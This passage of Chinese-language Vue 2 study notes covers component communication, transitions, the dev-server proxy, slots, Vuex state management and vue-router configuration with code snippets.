        Vue.directive(...)
        // 配置全局混合
        Vue.mixin(...)
    }
}
```

```js
使用插件：
// main.js
Vue.use()
```



## 7. scoped样式

作用：让样式局部生效，防止冲突

写法：

```html
<style scoped>
    .demo{
        background-color: orange;
    }
</style>
```





## 8. webStorage

1. 存储内容大小一般直出5MB左右（不同浏览器不一样）
2. 浏览器端通过`localStorage`和`sessionStorage`属性来实现本地存储机制

**API：**两者一至

```js
// 新增
localStorage.setItem('msg', 'hello') // 如果键名存在则更新‘
// 读取
localStorage.getItem('person')
// 移除
localStorage.removeItem('msg')
// 清空
localStorage.clear()
```

注意：

1. sessionStorage存储内容会随着浏览器窗口关闭而消逝
2. localStorage存储的内容，需要手动清除才会消失
3. `localStorage.getItem(xxx)`如果获取不到则返回null
4. `JSON.parse(null)`的结果依然是null





## 9. 自定义事件

**适用于：**子组件===>父组件

使用场景：a是父组件，b是子组件，b想传数据给a，那么就要在a中给b绑定自定义事件（事件的回调在a中）

```js
// app
<Student v-on:at="getStudentName"/>
methods: {
    getStudentName(name) {
      console.log(name);
    },
},

// 方法2
<Student ref="student" />
mounted() {
    this.$refs.student.$on("at", this.getStudentName); // vm挂载完毕给student组件挂载自定义事件
},
    
// 子组件
<button @click="sendStudentName">把学生名给app</button>
methods: {
    sendStudentName() {
      this.$emit("at", this.name); // 触发事件
      // this.$emit.once('at',this.name)  想让事件只触发一次，可使用once修饰符或$once方法
    },
},
```

想要解除自定义事件，可使用`this.$off('at')`

```js
<button @click="unbind">解绑at事件</button>

unbind() {
      // this.$off("at"); //解绑一个事件
      // this.$off(["at", "demo"]); // 解绑多个
      this.$off(); // 解绑所有
},
```

组件也可以绑定原生DOM事件，主要使用`native`修饰符

**注意：**通过`this.$refs.student.$on("at", 回调)`绑定自定义事件，回调**要么配置在methods中**，**要么用箭头函数**，否则this指向会出问题



 

## 10. 全局事件总线

是一种组件间通信的方式，适用于**任意组件间通信**

**安装：**

```js
new Vue({
    el: '#root',
    render: h => h(App),
    beforeCreate() {
        Vue.prototype.$bus = this // $bus就是当前应用的vm
    }
})
```

**使用：**

```js
mounted() {
    this.$bus.$on("hello", (data) => {
      console.log(data);
    });
  },
beforeDestroy() { // 组件销毁时解绑当前组件用到的事件
    this.$bus.$off("hello");
}
```

**提供数据：**

```js
this.$bus.$emit("hello", this.name);
```





## 11. 消息订阅与发布pubsub

是一种组件间通信的方式，适用于**任意组件间通信**

**安装：**

```shell
npm i pubsub-js
```

**引入：**

```js
import pubsub from "pubsub-js";
```

**接收数据：**

```js
mounted() {
    pubsub.subscribe("hello", function (msgName, data) {
      console.log("发布了消息，回调执行了", data);
    });
},
```

**提供数据：**

```js
const pubid = pubsub.publish("hello", this.name);
```

**取消订阅：**

```js
pubsub.unsubscript(this.pubid);
```





## 12. nextTick

```js
this.$nextTick('回调函数')
```

作用：在下一次dom更新结束后执行其指定的回调

用的时机：当改变数据后，要基于更新后的新dom进行某些操作是，要在nextTick所指定的回调函数中执行





## 13. 过度与动画

作用：在插入、更新或移除dom元素时，在合适的时候给元素添加样式类名

示例：

```html
<button @click="isShow = !isShow">显示/隐藏</button>
<transition name="hello" appear> name更改属性前缀
      <h1 v-show="isShow">你好</h1>
</transition>

data() {
    return {
      isShow: true,
    };
},
```

```css
1 {
  background-color: pink;
}
.hello-enter-active {
  animation: at 1s linear;
}
.hello-leave-active {
  animation: at 1s linear;
}
@keyframes at {
  from {
    transform: translateX(-100%);
  }
  to {
    transform: translateX(0px);
  }
}
```

写法2：

```css
h1 {
  background-color: pink;
  /* transition: 1s linear; */
}
/* 进入的起点 离开的终点*/
.hello-enter,
.hello-leave-to {
  transform: translateX(-100%);
}
/* 进入的终点 离开的起点*/
.hello-enter-to,
.hello-leave {
  transform: translateX(0);
}

/* 动画进入与离开的时候 */
.hello-enter-active,
.hello-leave-active {
  transition: 1s linear;
}
```

当多个元素都需要过度的时候，使用以下方法：

```html
<transition-group>
      <h1 v-show="isShow" key="1">你好</h1>
      <h1 v-show="isShow" key="2">你好</h1>
</transition-group>
```



**使用第三方库**：[animate](https://animate.style/)

安装：

```shell
npm install animate.css
```

引入：

```js
import 'animate.css';
```

使用：

```html
<transition-group
      name="animate__animated animate__bounce"
      appear
      enter-active-class="animate__swing"
      leave-active-class="animate__backOutUp" 这2个属性设置进入与离开动画样式
    >
    <h1 v-show="isShow" key="1">你好</h1>
    <h1 v-show="isShow" key="2">你好</h1>
</transition-group>
```







# 四、vue中的ajax



## 1. 代理

当一个请求url的**协议、域名、端口**三者之间任意一个与当前页面url不同即为跨域，需满足同源策略



以下案例存在跨域问题：

```vue
<template>
  <div>
    <button @click="getStudents">获取学生信息</button>
  </div>
</template>

<script>
import axios from "axios";
export default {
  name: "App",
  methods: {
    getStudents() {
      // 服务器开启在5000端口，本项目在8080端口，请求存在跨域问题
      axios.get("http://localhost:5000/students").then(
        (response) => {
          console.log("请求成功", response.data);
        },
        (error) => {
          console.log("请求失败", error.message);
        }
      );
    },
  },
};
</script>
```

**方法一：**

要解决需要在vue.config.js中配置代理服务器：

```js
module.exports = {
  // 开启代理服务器
  devServer: {
    proxy: 'http://localhost:5000'
  }
}
```

随后在项目中与代理服务器通信：本机在8080，代理服务器配置成5000与服务器通话，本机发送请求到同在本地8080的代理服务器，随后代理服务器向5000服务器通信

```js
axios.get("http://localhost:8080/students")
```

以上方法有2个不完美：

1. 不能开启2个代理服务器
2. 如public下有请求路径名称一样的资源，则不会与服务器通信



**方法二：**

```js
// vue.config.js
devServer: {
    proxy: {
      '/api': {
        target: 'http://localhost:5000',
        pathRewrite: { '^/api': '' },
        ws: true, //用于支持websocket
        changeOrigin: true //用于控制请求头中的host值
      },
      '/foo': {
        target: 'http://localhost:5001',
        pathRewrite: { '^/foo': '' },
      }
    }
}
```

```js
// 请求的路径需要假前缀
axios.get("http://localhost:8080/api/cars").then()
```

优点：可以配置多个代理，且可以灵活的控制请求是否走代理

缺点：配置略微繁琐，请求资源时必须加前缀







## 2. 插槽

同样的子组件里用不同的结构，实现不同的效果，在组件标签里写结构

让父组件可以向子组件指定位置插入html结构，也是一种组件键通信的方式，适用于父组件=>子组件



**默认插槽：**

```html
// app.js
<div class="container">
    <Category title="美食">
      <img
        src="https://img1.baidu.com/it/u=4154506085,2416245077&fm=253&fmt=auto&app=138&f=JPEG?w=625&h=500"
        alt=""
      />
    </Category>
    <Category title="游戏">
      <ul>
        <li v-for="(g, index) in games" :key="index">{{ g }}</li>
      </ul>
    </Category>
    <Category title="电影">
      <video
        controls
        src="http://clips.vorwaets-gmbh.de/big_buck_bunny.mp4"
      ></video>
    </Category>
</div>
```

```html
// 子组件里使用slot标识插入位置
<div class="Category">
    <h3>{{ title }}分类</h3>
    <slot>默认值，没有传结构就会显示</slot>
</div>
```

<img src="https://yrcx.oss-cn-chengdu.aliyuncs.com/image-20220829191025465.png" alt="image-20220829191025465" style="zoom:67%;" />







**具名插槽：**给标识的slot起名字，放结构的时候往相应的结构放

```html
使用时用slot="xxx"标记存放地
<div class="container">
    <Category title="美食">
      <img
        src="https://img1.baidu.com/it/u=4154506085,2416245077&fm=253&fmt=auto&app=138&f=JPEG?w=625&h=500"
        alt=""
        slot="center"
      />
      <a href="" slot="footer">我是链接</a>
    </Category>
    <Category title="游戏">
      <ul slot="center">
        <li v-for="(g, index) in games" :key="index">{{ g }}</li>
      </ul>
      <div class="foot" slot="footer">
        <a href="">单机游戏</a>
      </div>
    </Category>
    <Category title="电影">
      <video
        controls
        src="http://clips.vorwaets-gmbh.de/big_buck_bunny.mp4"
        slot="center"
      ></video>
       <div class="foot" slot="footer">
            <a href="">经典</a>
      	</div>
    </Category>
  </div>
```

```html
使用name="xxx"给slot起名
<div class="Category">
    <h3>{{ title }}分类</h3>
    <slot name="center">默认值，没有传结构就会显示</slot>
    <slot name="footer">默认值，没有传结构就会显示</slot>
</div>
```

扩展：如果使用到了template标签可使用新的标记存放地属性`v-slot:xxx`

```html
<template v-slot:footer>
        <div class="foot">
          <a href="">经典</a>
          <a href="">热门</a>
          <a href="">推荐</a>
        </div>
        <h4>欢迎观影</h4>
</template>
```

<img src="https://yrcx.oss-cn-chengdu.aliyuncs.com/image-20220829191005504.png" alt="image-20220829191005504" style="zoom:67%;" />





**作用域插槽：**数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定

接收数据则要使用`template`标签包裹，在属性配置中接收数据

```html
<template scope="at"> <!-- 此处为发送过来的数据接收 -->
        {{ at }} <!-- { "games": [ "红色警戒", "穿越火线", "劲舞团", "超级玛丽" ] } -->
</template>普通接收
<template scope="{games}"> 解构接收
<template slot-scope="at"> 新api接收
```

示例：

```html
<div class="container">
    
    <Category title="游戏">
      <template scope="at">
        <!-- {{ at }} { "games": [ "红色警戒", "穿越火线", "劲舞团", "超级玛丽" ] } -->
        <ul>
          <li v-for="(g, index) in at.games" :key="index">{{ g }}</li>
        </ul>
      </template>
    </Category>
    
    <Category title="游戏">
      <template scope="{games}">
        <ol>
          <li style="color: red" v-for="(g, index) in games" :key="index">
            {{ g }}
          </li>
        </ol>
      </template>
    </Category>
    
    <Category title="游戏">
      <template slot-scope="at">
        <h4 v-for="(g, index) in at.games" :key="index">{{ g }}</h4>
      </template>
    </Category>
    
</div>
```



数据发送则使用`<slot>`标签，也可使用name属性

```html
<slot :games="games">默认内容</slot>
```

示例：

```vue
// Category.vue
<div class="Category">
    <slot :games="games">默认内容</slot>
  </div>
<script>
    ... //数据在子组件
	data() {
    	return {
      	games: ["红色警戒", "穿越火线", "劲舞团", "超级玛丽"],
    	};
  	},
</script>
```

<img src="https://yrcx.oss-cn-chengdu.aliyuncs.com/image-20220829190837262.png" alt="image-20220829190837262" style="zoom: 67%;" />







# 五、vuex

**概念：**在vue中实现集中式状态（数据）管理一个vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信

在多个组件主要共享数据时使用



<img src="https://yrcx.oss-cn-chengdu.aliyuncs.com/image-20220829195030213.png" alt="image-20220829195030213" style="zoom: 25%;" />

<img src="https://yrcx.oss-cn-chengdu.aliyuncs.com/image-20220829195004580.png" alt="image-20220829195004580" style="zoom: 25%;" />





## 1. 基本使用

**搭建vuex环境：**

**安装vuex：**vue2中要安装3版本，默认安装4版本

```shell
npm i vuex@3
```



**创建文件：**`src/store/index.js`

```js
// 该文件用于创建vuex中最为核心的store
import Vue from 'vue'
import vuex from 'vuex'

Vue.use(vuex)

// 准备actions——用于相应组件中的动作
const actions = {}

// 准备mutations——用于操作数据（state）
const mutations = {}

// 准备state——用于存储数据
const state = {}


// 创建store
export default new vuex.Store({
    actions,
    mutations,
    state
})
```

**备注：** 若`actions`没有网络请求或其他业务操作逻辑，可越过actions，直接转交数据调用commit去mutations中执行函数

actions里的context（上下文对象）可获得许多属性，还可用`dispatch`调用同在actions的函数实现类似功能分区，防止一个函数不好维护

不在组件的函数中写业务逻辑而是写在store的index.js中是因为实现代码复用等



**配置store：**在main.js中创建vm时传入`store`配置项

```js
// 引入store
import store from './store'

new Vue({
    el: '#app',
    render: h => h(App),
    store,
}) 
```





**代码示例：**求和案例

```vue
Count.vue
// 将sum数据放入state中
<template>
	<h1>当前求和为：{{ $store.state.sum }}</h1> 页面中使用数据使用此方法
</template>

<script>
methods: {
    increment() {	// actions没操作的业务逻辑，直接转交数据的话可直接调用commit去mutations中执行函数
      this.$store.commit("JIA", this.n); 
    },
    decrement() {
      this.$store.commit("JIA", this.n);
    },
    incrementOdd() {
      this.$store.dispatch("jiaOdd", this.n);
    },
    incrementWait() {
      this.$store.dispatch("jiaWait", this.n);
    },
},
</script>
```

```js
// src/store/index.js
// 准备actions——用于相应组件中的动作
const actions = {
    jiaOdd(context, value) {
        console.log('actions被调用');
        if (context.state.sum % 2) {
            context.commit('JIA', value) //复用
        }
    },
    jiaWait(context, value) {
        console.log('actions被调用');
        setTimeout(() => {
            context.commit('JIA', value) //复用
        }, 500);
    },
}

// 准备mutations——用于操作数据（state）
const mutations = {
    JIA(state, value) {
        console.log('mutations被调用');
        state.sum += value
    },
    JIAN(state, value) {
        console.log('mutations被调用');
        state.sum -= value
    }
}

// 准备state——用于存储数据
const state = {
    sum: 0, // 当前的和
}
```



## 2. getters

想要将`state`中的数据进行加工展示，可以使用`getters`，类似`computed`计算属性

**配置与声明函数：**`src/store/index.js`

```js
const getters = {
    bigSum(state) {
        return state.sum * 10
    }
}


const store = new vuex.Store({
    actions,
    mutations,
    state,
    getters,
})
```



**使用：**

```html
<h1>当前求和方法10倍为：{{ $store.getters.bigSum }}</h1>
```





## 3. mapState和mapGetters

在之前的案例中可以发现模板想要获得state中的数据需要重复写`$store.state.xxx`，为了解决可以自己定义计算属性减少插值语法中的代码复杂：

```js
<h1>当前求和为：{{ he }}</h1>

computed: {
     he() {
      return this.$store.state.sum;
    },
}
```

即使这样还是避免不了需要自己定义大量重复代码，于是就可以使用`mapState`和`mapGetters`来优化：



**引入：**

```js
import { mapState, mapGetters } from "vuex";
```

**mapState方法：**用于帮我们映射`state`中的数据为计算属性

```js
computed: {
	// 方法一：借助mapState生成计算属性，从state中读取数据（对象写法）,键值对重复，可使用简写
	...mapState({ sum: "sum", school: "school", subject: "subject" }),

	// 方法二：借助mapState生成计算属性，从state中读取数据（数组写法）
	...mapState(["sum", "school", "subject"]),
}
```



**mapGetters方法：**用于帮我们映射`getters`中的数据为计算属性

```js
computed: {
	// 方法一：借助mapGetters生成计算属性，从getters中读取数据（对象写法）
    ...mapGetters({ bigSum: "bigSum" }),

    // 方法二：借助mapGetters生成计算属性，从getters中读取数据（数组写法）
    ...mapGetters(["bigSum"]),
}
```





## 4. mapMutations, mapActions

与上一个场景类似，触发某个事件更改数据的场景下需要重复写函数：

```js
<button @click="increment"> + </button>

 methods: {
   increment() {
      this.$store.commit("JIA", this.n);
    },
 }
```



**引入：**

```js
import { mapMutations, mapActions } from "vuex";
```



**mapMutations方法：**用于帮助我们生成`mutations`对话的方法，即`this.$store.commit("JIA", this.n)`函数

```js
<button @click="increment(n)">+</button> // 使用时必须传递参数

methods: {
	// 方法一：借助mapMutations生成对应的方法，方法中会调用commit去联系mutations（对象写法）
    ...mapMutations({ increment: "JIA", decrement: "JIAN" }),

    // 方法二：借助mapMutations生成对应的方法，方法中会调用commit去联系mutations（数组写法）
    ...mapMutations(["JIA", "JIAN"]), //对应调用时也要改成此名的函数
}
```



**mapActions方法：**用于帮助我们生成`actions`对话的方法，即`this.$store.dispatch("jiaOdd", this.n)`函数

```js
<button @click="incrementOdd(n)">当前求和为奇数再加</button>

methods: {
	// 方法一：借助mapActions生成对应的方法，方法中会调用dispatch去联系actions（对象写法）
    ...mapActions({ incrementOdd: "jiaOdd", incrementWait: "jiaWait" }),

    // 方法二：借助mapActions生成对应的方法，方法中会调用dispatch去联系actions（数组写法）
    ...mapActions(["jiaOdd", "jiaWait"]), //对应调用时也要改成此名的函数
}
```

**注意：**mapMutations, mapActions使用时如需要传递参数，需要在模板中绑定事件时传递好参数，否则参数是事件对象





## 5. vuex模块化

开发中会发现所有的方法，数据都放在了一个文件的相同对象中了，造成代码不好维护：

```js
// src/store/index.js
const actions = {
	a组件方法,
    b组件方法
}
const mutations = {
	a组件方法,
    b组件方法
}
const state = {
	a组件数据,
    b组件数据
}
```



所以引出了**模块化**的概念：将单个组件的数据函数单独拆分成一个对象

```js
// src/store/index.js

// 求和相关的配置
const countOptions = {
    namespaced: true,
    actions: {},
    mutations: {},
    state: {},
    getters: {},
}

// 人员管理相关的配置
const personOptions = {
    namespaced: true,
    actions: {},
    mutations: {},
    state: {},
    getters: {},
}
```

在创建store的时候**配置**：

```js
// 创建store
const store = new vuex.Store({
    modules: {
        countAbout: countOptions,
        personAbout: personOptions
    }
})
```

此时的vm的$store.state的数据存储由原本的直接看得到sum、school，变成了只看得见countOptions，而数据在这个对象的里面



因此想要直接拿到对应的最里层的数据，可使用以下**方法**：

```js
<h1>当前求和为：{{ sum }} </h1>

// 方法的第一个数据配置想要拿到谁的数据，第二个写对应的里层的数据
computed: {
	...mapState("countAbout", ["sum", "school", "subject"]),
    ...mapState("personAbout", ["personList"]),
}
```

```js
methods: {
    ...mapMutations("countAbout", { increment: "JIA", decrement: "JIAN" }),
    ...mapActions("countAbout", {incrementOdd: "jiaOdd",incrementWait: "jiaWait",}),
},
```

**注意：**使用此方法必须在配置对象里写入` namespaced: true`，默认为false 









# 六、vue-router





## 1. 基本使用

**安装：**

```shell
npm i vue-router@3 #vue2版本安装
```

**应用插件：**`main.js`

```js
// 引入VueRouter
import VueRouter from 'vue-router'

// 应用插件
Vue.use(VueRouter)

new Vue({
    el: '#app',
    render: h => h(App),
    router
}) 
```



**创建路由：**`src/router/index.js`

```js
// 该文件用于专门创建整个应用的路由器
import VueRouter from 'vue-router'
// 引入组件
import About from '../pages/About'
import Home from '../pages/Home'

// 创建并暴露一个路由器
export default new VueRouter({
    routes: [
        {
            path: '/about',
            component: About
        },
        {
            path: '/home',
            component: Home
        }，
        // 补充：重定向
        {
            path: '/',
            redirect: '/home'
        }
    ]
})
```



**实现切换：**替换a标签，`active-class`用于指定选中后的样式，`to`为原来的`href`

```html
<router-link class="list-group-item" active-class="active" to="/about">About</router-link>
<router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
```



**指定组件的呈现位置：**

```html
<router-view></router-view>
```



**注意点：**

1. 路由组件通常放在`pages`文件夹，一般组件通常方法`components`文件夹
2. 通过切换，消失了的路由组件，默认是被销毁了的，需要的时候再去挂载
3. 每个组件都有自己的`$route`属性，里面存储着自己的路由信息
4. 整个应用只有一个`route`，可以通过组件的`$router`属性获取到





## 2. 嵌套（多级）路由



配置路由规则，使用`children`配置项：

```js
{
    path: '/home',
    component: Home,
    children: [ // 可能会有很多个二级，所以是数组
        {
            path: 'news', // 子路由不写/
            component: News
        },
        {
            path: 'message',
            component: Message
        }
    ]
}
```

二级跳转的时候要写跳转的**完整路径**：

```html
 <router-link class="list-group-item" active-class="active" to="/home/news">News</router-link>
```





## 3. 路由携带query参数

```
访问样式
http://localhost:8080/#/home/message/detail?id=003&title=你好
```

**传参：**

```html
<ul>
    <li v-for="m in messageList" :key="m.id">
        <!-- 跳转路由并携带query参数，to的字符串写法 -->
        <router-link :to="`/home/message/detail?id=${m.id}&title=${m.title}`">{{m.title}}</router-link>

 		<!-- 跳转路由并携带query参数，to的对象写法 -->
        <router-link :to="{
            path:'/home/message/detail',
            query:{id:m.id,title:m.title}
            }">
            {{m.title}}
        </router-link>
    </li>
</ul>
```



**使用：**

```html
<ul>
    <li>消息编号：{{$route.query.id}}</li>
    <li>消息标题：{{$route.query.title}}</li>
</ul>
```





## 4. 命名路由

作用：可以简化路由的跳转代码



**命名：**

```js
...省略多级嵌套
{
    name: 'xiangqing', // 给路由命名
    path: 'detail',
    component: Detail,
}
```



**简化：**

```html
<!-- 简化前 -->
<router-link :to="{
    name:'/home/message/detail',
    query:{id:m.id,title:m.title}
    }">
    {{m.title}}
</router-link>

<!-- 简化后 -->
<router-link :to="{
    name:'xiangqing',
    query:{id:m.id,title:m.title}
    }">
    {{m.title}}
</router-link>
```

```html
<!-- 简化前 -->
<router-link  to="/about">About</router-link>

<!-- 简化后 -->
<router-link  :to="{name:'guanyu'}">About</router-link>
```





## 5. params

```
访问样式：
http://localhost:8080/#/home/message/detail/001/%E6%B6%88%E6%81%AF001
```



**传参：**

```html
 <!-- 跳转路由并携带params参数，to的字符串写法 -->
<router-link to="/home/message/detail/666/title">{{m.title}}</router-link>
<router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{m.title}}</router-link>

 <!-- 跳转路由并携带params参数，to的对象写法 -->
<router-link :to="{
    name:'xiangqing', 此处不能使用path写法！！！
    params:{id:m.id,title:m.title}
    }">
    {{m.title}}
</router-link>
```



**接收：**

```html
<ul>
    <li>消息编号：{{$route.params.id}}</li>
    <li>消息标题：{{$route.params.title}}</li>
</ul>
```



**特别注意：**路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置







## 6. props参数

以往的接收值带来代码重复的问题：

```html
<li>消息编号：{{$route.params.id}}</li>
<li>消息编号：{{$route.params.title}}</li>
```

为了省略重复的代码，可使用props参数：



**props的第一种写法：**值为对象，该对象中的所有的key-value都会以props的形式传给Detail组件

```js
...省略嵌套
{
    name: 'xiangqing',
    path: 'detail/:id/:title',
    component: Detail,
    
    props: { a: 1, b: 'hello' }
}
```

```vue
<template>
        <p>a:{{a}}</p> 接收
        <p>b:{{b}}</p>
</template>
<script>
    export default {
        name:'Detail',
        props:['id','title'],
    }
</script>
```



**props的第二种写法：**值为布尔值，为真，就把该路由组件收到的所有`params`参数，以props的形式传给Detail组件

```js
props: true
```

```html
接收
<li>消息编号：{{id}}</li>
<li>消息标题：{{title}}</li>

props:['id','title'],
```



 **props的第三种写法：**值为函数,该函数返回的对象每一组key-value都会通过props传给Detail组件

```js
...
path: 'detail',
props($route) {
    return {
        id: $route.query.id,
        title: $route.query.title
    }
}
```





## 7. router-link的replace属性

**作用：**控制路由跳转时操作浏览器历史记录的模式

浏览器的历史记录有两种写入方式，分别为`push`和`replace`，`push`是追加历史记录，`replace`**是替换当前记录**，路由跳转时默认为push

**开启replace模式：**

```html
<router-link replace active-class="active" :to="{name:'guanyu'}">About</router-link>
```





## 8. 编程式路由导航

作用：不借助`<router-link>`实现路由的跳转，使之更灵活、



**push实现有历史记录查看：**

```js
<button @click="pushShow(m)">push查看</button>

 pushShow(m){
    this.$router.push({ // 传递参数和router-link的to方法一样
        name:'xiangqing',
        query:{id:m.id,title:m.title}
    })
},
```



**replace无历史记录查看：**

```js
<button @click="replaceShow(m)">replace查看</button>

replaceShow(m){
    this.$router.replace({
        name:'xiangqing',
        query:{id:m.id,title:m.title}
    })
}
```



**额外的3个方法：**调用对应的方法实现对应的功能

```js
<button @click="back">后退</button>
<button @click="forward">前进</button>
<button @click="test">go</button>

methods:{
    back(){
        this.$router.back()
    },
    forward(){
        this.$router.forward() 
    },
    test(){
        this.$router.go(2) // 传几就动几步，整数前进，负数后退
    }
}
```





## 9. 缓存路由组件

**作用：**让不展示的路由组件保持挂载，不被销毁

**具体编码：**使用`<keep-alive >`标签包裹不销毁的组件，`include`的值为组件名，指定对应的组件挂载，不写就所有的组件都不销毁

```html
<!-- 缓存一个 -->
<keep-alive include="News">
        <router-view></router-view>
</keep-alive>

<!-- 缓存多个 -->
<keep-alive include="['News','Message']">
```





## 10. activated和deactivated钩子

**作用：**路由组件所独有的两个够细，用于捕获路由组件的激活状态、



场景：想要组件切走不销毁保持挂载，但是就不能执行里面的`beforeDestroy`销毁钩子，造成不能执行一些函数如定时器的销毁



```js
activated(){ // 路由组件被激活时触发
    this.timer=  setInterval(()=>{
        this.opacity -=0.01
        if(this.opacity<=0) this.opacity=1
    },16)
},
deactivated(){ // 路由组件失活时触发
    clearInterval(this.timer)
}
```







## 11. 全局路由守卫

场景：要在路由切换的时候判断是否有权限查看对应的组件



**全局前置路由守卫**

**方法：**初始化的时候、在路由切换之前调用

```js
router.beforeEach((to, from, next) => {}) // to：去哪里，from：来自哪里，next：通过
```

**配置：**

```js
// src/router/index.js
const router = new VueRouter({})

// 全局前置路由守卫
router.beforeEach((to, from, next) => { // 初始化的时候、在路由切换之前调用
    if (localStorage.getItem('school') === 'at') {
        next()
    }

})

export default router
```

**鉴权写法：**

```js
 { 
    name: 'guanyu',
    path: '/about',
    component: About,
    meta: { isAuth: true } // 配置是否需要鉴权
},
    
router.beforeEach((to, from, next) => { 
    if (to.meta.isAuth) { // 判断是否需要鉴权
        if (localStorage.getItem('school') === 'at') {
            next()
        }
    } else {
        next()
    }
})
```





**全局后置路由守卫**

后置路由守卫——初始化的时候、在路由切换之后调用

```js
router.afterEach((to, from) => {
    if (to.meta.title) {
        document.title = to.meta.title // 修改网页的title
    } else {
        document.title = 'vue_test'
    }
})

```





## 12. 独享路由守卫

某一个路由单独配置一套规则：

```js
{
    name: 'guanyu',
    path: '/about',
    component: About,
    beforeEnter: (to, from, next) => {
        if (to.meta.isAuth) { // 判断是否需要鉴权
            if (localStorage.getItem('school') === 'at') {
                next()
            }
        } else {
            next()
        }
    }
},
```



## 13. 组件路由守卫

```js
// 通过路由规则，进入该组件时调用
beforeRouteEnter(to,from,next){

},
// 通过路由规则，离开该组件时调用
beforeRouteLeave(to,from,next){

}
```





## 14. 路由器的两种工作模式

对于一个url来说，#及其后面的内容就是hash值，hash值不会包含在HTTP请求中，即：hash值不会带给服务器

**hash模式：**

- 地址中永远带着#号，不美观
- 若以后将地址通过第三方手机app分享，若app校验严格则地址被标记不合法
- 兼容性好

**history模式：**

- 在创建路由器的时候配置`mode: 'history',`
- 地址干净美观
- 兼容性比hash略差
- 后端人员可解决刷新页面404的问题（npm：connect-history-api-fallback）





# 七、Vue UI组件库



## 1. 移动端

Vant： https://youzan.github.io/vant

Cube UI： https://didi.github.io/cube-ui

Mint UI： http://mint-ui.github.io





## 2. pc端

Element UI ：https://element.eleme.cn

IView UI ：https://www.iviewui.co



